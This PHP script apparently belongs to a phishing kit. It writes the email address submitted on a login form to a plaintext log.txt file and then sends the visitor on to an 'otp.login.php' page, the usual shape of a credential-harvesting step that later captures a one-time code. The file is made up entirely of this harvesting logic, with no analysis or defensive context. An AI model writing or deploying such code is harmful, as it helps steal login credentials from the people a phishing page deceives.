<?php

    file_put_contents("log.txt", "Email: " . $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();